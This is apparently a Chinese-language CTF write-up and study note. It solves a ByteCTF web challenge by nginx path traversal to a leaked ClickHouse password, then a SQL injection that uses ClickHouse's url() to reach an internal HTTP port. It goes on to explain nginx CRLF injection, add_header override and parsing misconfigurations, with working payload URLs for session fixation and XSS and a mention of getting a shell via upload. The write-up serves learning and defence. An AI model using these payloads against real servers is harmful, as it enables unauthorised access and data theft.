第一步：

nginx配置不当导致目录穿越

http://39.105.175.150:30001/files../var/lib/clickhouse/access/

有个sql文件 下载下来后拿到数据库密码


ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';

ATTACH GRANT SELECT ON ctf.* TO user_01;

通过其自带内网的http服务登录user_01拿到flag

```php
http://39.105.175.150:30001/?id=1 union all select extractTextFromHTML(html) FROM url('http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag',RawBLOB,'html String');--
# ByteCTF{e3b0c44298fc1c149afbf4c8}
```

知识点：

ngnix配置不当导致目录穿越

Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。
错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：

利用方法：

![](https://img-blog.csdnimg.cn/20181116174450974.png)

穿越上层目录

![](https://img-blog.csdnimg.cn/20181116174455219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

漏洞修复

![](https://img-blog.csdnimg.cn/20181116174504524.png)

![](https://img-blog.csdnimg.cn/20181116174507397.png)

crlf注入：
-

什么是crlf注入：

回车换行（CRLF）注入攻击是一种当用户将CRLF字符插入到应用中而触发漏洞的攻击技巧。CRLF字符（%0d%0a）在许多互联网协议中表示行的结束，包括HTML，该字符解码后即为\ r\ n。这些字符可以被用来表示换行符，并且当该字符与HTTP协议请求和响应的头部一起联用时就有可能会出现各种各样的漏洞，包括http请求走私（HTTP RequestSmuggling）和http响应拆分（HTTP Response Splitting）。

明天要看的文章：

https://www.cnblogs.com/mysticbinary/p/12560080.html

https://www.cnblogs.com/mysticbinary/p/12560080.html

漏洞原理

```php

Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。

错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：

location / {
    return 302 https://$host$uri;
}

利用方式

访问 192.168.91.130:8080

正常跳转

![](https://img-blog.csdnimg.cn/20181116173700538.png)

会话固定

payload

http://192.168.91.130:8080/%0ASet-cookie:JSPSESSID%3D360

![](https://img-blog.csdnimg.cn/20181116173708141.png)

返回包

![](https://img-blog.csdnimg.cn/20181116173713712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

反射性XSS

payload

http://192.168.91.130:8080/%0D%0A%0D%0A%3Cimg%20src=1%20onerror=alert(/xss/)%3E

https://img-blog.csdnimg.cn/20181116174035141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70

为什么没弹窗？

浏览器Filter对XSS特征进行了过滤，并且浏览器进行了跳转如何阻止浏览器跳转，参考链接：

https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html

https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html


漏洞修复
```php
location /{
return 302 https://$host$request_uri
}
```
使用不解码的跳转方式

ngnix漏洞3 add_header被覆盖
-
Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。

如下列代码，整站（父块中）添加了CSP头：

```php
add_header Content-Security-Policy "default-src 'self'";
add_header X-Frame-Options DENY;
location = /test1 {
    rewrite ^(.*)$ /xss.html break;
}
location = /test2 {
    add_header X-Content-Type-Options nosniff;
    rewrite ^(.*)$ /xss.html break;
}
```

但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效：

![](https://nc0.cdn.zkaq.cn/md/6508/02483addcfc297e89b0636d98792d82a_52328.png)

XSS可被触发：

![](![image](https://user-images.githubusercontent.com/87234369/138077590-596fd965-5a37-4552-8d60-eac82d9b8512.png)

什么是csp头：
-

Content-Security-Policy

跨域脚本攻击（XSS）是最常见、危害最大的网页安全漏洞。

为了防止它，要采取很多编程措施（比如大多数人都知道的转义、过滤HTML）。很多人提出，能不能根本上解决问题，即浏览器自动禁止外部注入恶意脚本？

这就是"内容安全策略"（Content Security Policy，缩写 CSP）的由来。

两种方法可以启用 CSP：

设置 HTTP 的 Content-Security-Policy 头部字段
设置网页的<meta>标签。
网上的资料都有讲到它们怎么使用，但是很少有代码演示，不敲一遍就不够理解，下面我会直接上些例子。
（1）使用HTTP的 Content-Security-Policy头部
在服务器端使用 HTTP的 Content-Security-Policy头部来指定你的策略，像这样:

Content-Security-Policy: policy
policy参数是一个包含了各种描述CSP策略指令的字符串。

x-content-type-options头
-


如果服务器发送响应头 "X-Content-Type-Options: nosniff"，则 script 和 styleSheet 元素会拒绝包含错误的 MIME 类型的响应。这是一种安全功能，有助于防止基于 MIME 类型混淆的攻击。

 

简单理解为：通过设置"X-Content-Type-Options: nosniff"响应标头，对 script 和 styleSheet 在执行是通过MIME 类型来过滤掉不安全的文件

服务器发送含有 "X-Content-Type-Options: nosniff" 标头的响应时，此更改会影响浏览器的行为。

 

如果通过 styleSheet 参考检索到的响应中接收到 "nosniff" 指令，则 Windows Internet Explorer 不会加载“stylesheet”文件，除非 MIME 类型匹配 "text/css"。

如果通过 script 参考检索到的响应中接收到 "nosniff" 指令，则 Internet Explorer 不会加载“script”文件，除非 MIME 类型匹配以下值之一：

 

"application/ecmascript"

"application/javascript"

"application/x-javascript"

"text/ecmascript"

"text/javascript"

"text/jscript"

"text/x-javascript"

"text/vbs"

"text/vbscript"


漏洞防御

在/test2的location中删除X-Content-Type-Options头



 nginx 解析漏洞
 -
 
 访问http://URL/uploadfiles/nginx.png和http://URL/uploadfiles/nginx.png/.php即可查看效果
 
 ![](https://nc0.cdn.zkaq.cn/md/6508/f6756c4335842e461236fe30e1ffb721_93045.png)
 
 增加/.php后缀，被解析成PHP文件：
 
 ![](https://nc0.cdn.zkaq.cn/md/6508/c5e37c89df45c215a04d74b23756ee65_13165.png)
 
 也可配合文件上传来getshell。此处不再演示。


以上是根据这次字节跳动的ctf比赛而找的一些知识点，看了很多大佬博客，所以我觉得应该挺全了吧算是。

参考

https://www.jianshu.com/p/74ea9f0860d2

https://www.cnblogs.com/taosiyu/p/14827849.html
明天看
https://www.cnblogs.com/mysticbinary/p/12560080.html
